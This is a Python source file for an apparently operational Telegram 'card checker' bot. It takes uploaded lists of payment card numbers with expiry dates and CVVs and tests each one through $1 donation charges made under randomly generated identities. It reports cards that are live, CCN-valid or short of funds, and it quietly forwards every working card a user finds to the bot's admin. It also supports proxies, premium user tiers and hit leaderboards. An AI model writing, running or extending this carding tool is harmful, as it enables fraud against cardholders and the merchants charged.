import os
import time
import threading
import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import *
from utils import *
from payment_handler import *

current_processing = {}

async def send_tele(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {'chat_id': chat_id, 'text': message}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        return response.status_code == 200
    except:
        return False

async def send_enhanced_hit_to_admin(card, user_info, response_text, bin_info, user_role, vbv_status):
    if "CCN" in response_text:
        hit_message = f"🟡 **CCN FOUND BY USER** 🟡\n\n"
    elif "Insufficient" in response_text:
        hit_message = f"🟠 **INSUFFICIENT FUNDS BY USER** 🟠\n\n"
    elif "LIVE" in response_text:
        hit_message = f"🟢 **CVV LIVE BY USER** 🟢\n\n"
    else:
        hit_message = f"🎯 **HIT FOUND BY USER** 🎯\n\n"
    
    hit_message += f"**Card:** `{card}`\n"
    hit_message += f"**Response:** {response_text}\n"
    hit_message += f"**Amount:** $1.00\n"
    hit_message += f"**VBV Status:** {vbv_status}\n\n"
    
    hit_message += f"**Issuer:**\n"
    hit_message += f"{bin_info['bank']}, {bin_info['brand']}, {bin_info['type']}\n"
    hit_message += f"{bin_info['country']}\n\n"
    
    hit_message += f"**User:** {user_role}\n"
    hit_message += f"**User ID:** `{user_info['id']}`\n"
    hit_message += f"**Time:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    hit_message += f"**Bot By:** @DoubleT2245"
    
    await send_tele(ADMIN_ID, hit_message)

async def send_enhanced_progress(chat_id, session, current_card, response_text, bin_info, vbv_status, user_info=None):
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    user_role = get_user_role(chat_id)
    
    # ONLY send messages for these statuses - NO DECLINED MESSAGES
    if "CCN" in response_text:
        message = f"🟡 **CCN FOUND** 🟡\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: {response_text}\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    elif "Insufficient" in response_text:
        message = f"🟠 **INSUFFICIENT FUNDS** 🟠\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: You Balance Is Lower Than $1.00\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    elif "LIVE" in response_text:
        message = f"🟢 **CVV LIVE** 🟢\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: {response_text}\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    else:
        # DON'T send message for declined/other statuses
        return
    
    message += f"🏦 **Issuer:**\n"
    message += f"{bin_info['bank']}, {bin_info['brand']}, {bin_info['type']}\n"
    message += f"{bin_info['country']}\n\n"
    
    message += f"📊 PROGRESS : {progress}% ({session['processed']}/{session['total']})\n"
    message += f"✔ LIVE : {session['live']}\n"
    message += f"✔ INSUFFICIENT : {session['insufficient']}\n"
    message += f"✔ CCN : {session['ccn']}\n"
    message += f"✔ HIT : {session['hit']}\n\n"
    
    message += f"{user_role}\n"
    message += "🤖 BOT BY : @DoubleT2245"
    
    await send_tele(chat_id, message)
    
    # Auto send hit to admin only for these statuses
    if user_info and not is_admin(chat_id) and any(x in response_text for x in ["LIVE", "CCN", "Insufficient"]):
        await send_enhanced_hit_to_admin(current_card, user_info, response_text, bin_info, user_role, vbv_status)
        
        users = load_users()
        user_id_str = str(chat_id)
        if user_id_str in users:
            users[user_id_str]['hits_found'] = users[user_id_str].get('hits_found', 0) + 1
            save_users(users)

def process_card_file(chat_id, file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        session = load_session()
        session['total'] = len(lines)
        session['processed'] = 0
        session['live'] = 0
        session['insufficient'] = 0
        session['hit'] = 0
        session['ccn'] = 0
        session['current_file'] = file_path
        save_session(session)
        
        users = load_users()
        user_info = users.get(str(chat_id), {'id': str(chat_id), 'username': 'Unknown', 'joined': 'Unknown'})
        
        asyncio.run(send_tele(chat_id, f"🚀 Starting check on {session['total']} cards..."))
        
        for line in lines:
            if chat_id in current_processing and not current_processing[chat_id]:
                break
                
            card = line.strip()
            if not card:
                continue
                
            parts = card.split('|')
            if len(parts) < 4:
                continue
                
            cc_no, month, year, cvv = [part.strip() for part in parts[:4]]
            
            payment_result = payment(card, cc_no, month, year, cvv)
            vbv_status = payment_result[2] if len(payment_result) > 2 else "VBV - Unknown"
            
            if payment_result[0]:
                random_info = random_user_info()
                if random_info[0]:
                    donate_result = enhanced_donate(card, payment_result[1], random_info[1], random_info[2], vbv_status)
                    vbv_status = donate_result[5] if len(donate_result) > 5 else vbv_status
                    
                    if donate_result[0]:
                        if donate_result[1] == "live":
                            session['live'] += 1
                            session['hit'] += 1
                            response_text = f"LIVE - {donate_result[2]}"
                        elif donate_result[1] == "ccn":
                            session['ccn'] += 1
                            response_text = f"CCN - {donate_result[2]}"
                        elif donate_result[1] == "insufficient":
                            session['insufficient'] += 1
                            response_text = "Insufficient Funds"
                    else:
                        # Declined cards - DON'T send message
                        response_text = f"Declined - {donate_result[2]}"
                        # Skip message sending for declined
                        session['processed'] += 1
                        save_session(session)
                        continue
                else:
                    # Random gen failed - DON'T send message
                    response_text = "Random Gen Failed"
                    session['processed'] += 1
                    save_session(session)
                    continue
            else:
                # Payment failed - DON'T send message
                response_text = payment_result[1]
                session['processed'] += 1
                save_session(session)
                continue
            
            session['processed'] += 1
            save_session(session)
            
            bin_info = get_bin_info(cc_no)
            
            # This function will only send messages for LIVE, CCN, INSUFFICIENT
            asyncio.run(send_enhanced_progress(chat_id, session, card, response_text, bin_info, vbv_status, user_info))
            
            time.sleep(5)
        
        final_message = f"✅ CHECK COMPLETED!\nProcessed: {session['processed']} cards\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nCCN: {session['ccn']}\nHIT: {session['hit']}"
        asyncio.run(send_tele(chat_id, final_message))
        
        if chat_id in current_processing:
            del current_processing[chat_id]
            
    except Exception as e:
        asyncio.run(send_tele(chat_id, f"❌ Error processing file: {str(e)}"))

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.\n\nContact admin to get access.")
        return
    
    add_user(user_id, username)
    
    user_role = get_user_role(user_id)
    
    welcome_text = f"🔄 Zo Card Checker Activated\n\n👤 {user_role}\n\nSend me a .txt file with cards to start checking!\n\nCommands:\n/status - Check progress\n/help - Show help"
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.")
        return
    
    help_text = "🤖 Zo Card Checker Help\n\nJust send a .txt file with cards in format:\nCC|MM|YYYY|CVV\n\nExample:\n4111111111111111|12|2025|123\n\nBot will automatically start checking and show real-time results!\n\n📢 Only LIVE, CCN, and INSUFFICIENT cards will show messages."
    await update.message.reply_text(help_text)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.")
        return
    
    session = load_session()
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    user_role = get_user_role(user_id)
    
    status_text = f"📊 CURRENT STATUS\nUser: {user_role}\nProgress: {progress}% ({session['processed']}/{session['total']})\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nCCN: {session['ccn']}\nHIT: {session['hit']}"
    await update.message.reply_text(status_text)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addproxy host|port|user|pass")
        return
    
    proxy_data = context.args[0].split('|')
    if len(proxy_data) < 2:
        await update.message.reply_text("Usage: /addproxy host|port|user|pass")
        return
    
    config = {
        "proxy_host": proxy_data[0],
        "proxy_port": proxy_data[1],
        "proxy_username": proxy_data[2] if len(proxy_data) > 2 else "",
        "proxy_password": proxy_data[3] if len(proxy_data) > 3 else ""
    }
    save_config(config)
    
    await update.message.reply_text(f"✅ Proxy configured: {proxy_data[0]}:{proxy_data[1]}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ban USER_ID")
        return
    
    target_id = context.args[0]
    
    if ban_user(target_id):
        await update.message.reply_text(f"✅ User {target_id} banned and removed")
    else:
        await update.message.reply_text("⚠️ User already banned")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /unban USER_ID")
        return
    
    target_id = context.args[0]
    
    if unban_user(target_id):
        await update.message.reply_text(f"✅ User {target_id} unbanned")
    else:
        await update.message.reply_text("⚠️ User not found in ban list")

async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /adduser USER_ID [username] [premium]")
        return
    
    target_id = context.args[0]
    username = context.args[1] if len(context.args) > 1 else ""
    is_premium = context.args[2].lower() == 'premium' if len(context.args) > 2 else False
    
    if add_user(target_id, username, is_premium):
        user_type = "⭐ Premium" if is_premium else "👤 User"
        await update.message.reply_text(f"✅ {user_type} {target_id} added successfully")
    else:
        await update.message.reply_text("❌ Failed to add user (might be banned)")

async def setpremium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /setpremium USER_ID [on/off]")
        return
    
    target_id = context.args[0]
    premium_status = context.args[1].lower() == 'on' if len(context.args) > 1 else True
    
    if set_premium(target_id, premium_status):
        status = "enabled" if premium_status else "disabled"
        await update.message.reply_text(f"✅ Premium status {status} for user {target_id}")
    else:
        await update.message.reply_text("❌ User not found")

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /removeuser USER_ID")
        return
    
    target_id = context.args[0]
    
    if remove_user(target_id):
        await update.message.reply_text(f"✅ User {target_id} removed successfully")
    else:
        await update.message.reply_text("⚠️ User not found")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    users = load_users()
    banned_users = load_banned()
    user_count = len(users)
    banned_count = len(banned_users)
    
    premium_count = sum(1 for u in users.values() if u.get('is_premium', False))
    active_count = sum(1 for u in users.values() if u.get('is_active', True))
    
    message = f"📊 User Management\n\nTotal Users: {user_count}\nPremium Users: {premium_count}\nActive Users: {active_count}\nBanned Users: {banned_count}\n\n"
    
    if users:
        message += "👥 Active Users:\n"
        for user_data in list(users.values())[:15]:
            user_role = get_user_role(user_data['id'])
            message += f"• {user_role} - ID: {user_data['id']}\n"
            message += f"  Username: @{user_data.get('username', 'N/A')}\n"
            message += f"  Hits: {user_data.get('hits_found', 0)}\n"
            message += f"  Joined: {user_data.get('joined', 'Unknown')}\n\n"
    else:
        message += "No active users found.\n\n"
    
    if banned_users:
        message += "🚫 Banned Users:\n"
        for banned_id in banned_users[:10]:
            message += f"• ID: {banned_id}\n"
    
    await update.message.reply_text(message)

async def hits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    users = load_users()
    total_hits = 0
    hit_users = []
    
    for user_data in users.values():
        hits = user_data.get('hits_found', 0)
        if hits > 0:
            total_hits += hits
            hit_users.append(user_data)
    
    hit_message = f"🎯 Hit Statistics\n\nTotal Hits: {total_hits}\n\n"
    
    if hit_users:
        hit_users.sort(key=lambda x: x.get('hits_found', 0), reverse=True)
        
        hit_message += "🏆 Top Users:\n"
        for user_data in hit_users[:10]:
            user_role = get_user_role(user_data['id'])
            hit_message += f"• {user_role} - @{user_data.get('username', 'Unknown')}\n"
            hit_message += f"  Hits: {user_data.get('hits_found', 0)}\n"
            hit_message += f"  ID: {user_data['id']}\n\n"
    else:
        hit_message += "No hits recorded yet.\n"
    
    await update.message.reply_text(hit_message)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.\n\nContact admin to get access.")
        return
    
    add_user(user_id, username)
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send only .txt files")
        return
    
    if user_id in current_processing and current_processing[user_id]:
        await update.message.reply_text("⚠️ Already processing a file. Please wait...")
        return
    
    current_processing[user_id] = True
    
    try:
        file = await document.get_file()
        file_path = os.path.join(UPLOAD_DIR, f"{user_id}_{document.file_name}")
        await file.download_to_drive(file_path)
        
        user_role = get_user_role(user_id)
        await update.message.reply_text(f"📁 File received: {document.file_name}\n👤 {user_role}\nStarting processing...\n\n📢 Only LIVE, CCN, and INSUFFICIENT cards will show messages.")
        
        thread = threading.Thread(target=process_card_file, args=(user_id, file_path))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error downloading file: {str(e)}")
        current_processing[user_id] = False

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.")
        return
    
    if user_id in current_processing:
        current_processing[user_id] = False
        await update.message.reply_text("🛑 Check stopped by user")
    else:
        await update.message.reply_text("⚠️ No active process to stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    
    # User management commands
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("adduser", adduser_command))
    app.add_handler(CommandHandler("setpremium", setpremium_command))
    app.add_handler(CommandHandler("removeuser", removeuser_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("hits", hits_command))
    
    # Document handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🤖 Bot is running with enhanced access control and VBV check...")
    print("📢 Only LIVE, CCN, and INSUFFICIENT cards will show messages.")
    app.run_polling()

if __name__ == '__main__':
    main()
